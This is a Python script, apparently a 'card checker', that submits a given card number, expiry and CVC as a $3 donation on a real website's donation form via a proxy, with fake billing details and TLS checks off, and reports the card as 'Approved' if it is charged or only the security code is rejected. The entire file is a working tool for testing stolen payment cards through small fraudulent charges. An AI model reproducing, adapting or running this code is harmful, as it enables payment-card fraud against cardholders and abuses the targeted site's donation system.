from httpx import AsyncClient
import asyncio


headers_default = {
    "User-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
}


def capture(text, start, end):
    start_idx = text.find(start)
    if start_idx == -1:
        return ""
    start_idx += len(start)
    end_idx = text.find(end, start_idx)
    if end_idx == -1:
        return ""
    return text[start_idx:end_idx]


async def gateway_stripe3(cc: str, month: str, year: str, cvc: str, proxyg: dict):

    if len(year) == 2:
        year = f"20{year}"
    if len(month) == 2 and month[0] == "0":
        month = month[1]
    email = "elpapulince@gmail.com"  
    

    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as session:

        headers = headers_default
       
        data = {
            "amount": "",
            "amount.text": "3",
            "frequency": "one-time",
            "method": "cc",
            "email": email,
            "comments": "",
        }

        response = await session.post(
            "https://freerepublic.com/donate/", headers=headers, data=data
        )

        data = {
            "foreign": "0",
            "number": cc,
            "month": month,
            "year": year,
            "first_name": "Minos",
            "last_name": "Tbug",
            "address": "New York",
            "city": "New York",
            "state": "ny",
            "zip": "10080",
            "email": email,
            "phone": "2152501914",
            "country": "usa",
        }

        # Segundo POST request
        response = await session.post(
            response.url,
            headers=headers,
            data=data,
        )
        
        response_text = response.text

    status = "Declined ❌"
    mensaje = "Error desconocido"

    if "Thank you for your contribution!" in response_text:
        mensaje = "Charged 3$"
        status = "Approved ✅"
    else:

        mensaje = (
            capture(
                response_text,
                '<div style="background: #ccd; border: 1px solid black; padding: 5px; margin-bottom: 1em">',
                "</div>",
            )
            .replace("An error occurred during processing.", "")
            .strip()
        )

        if "Your card's security code is incorrect." in mensaje:
            status = "Approved ✅"
        else:
            status = "Declined ❌"

    return status, mensaje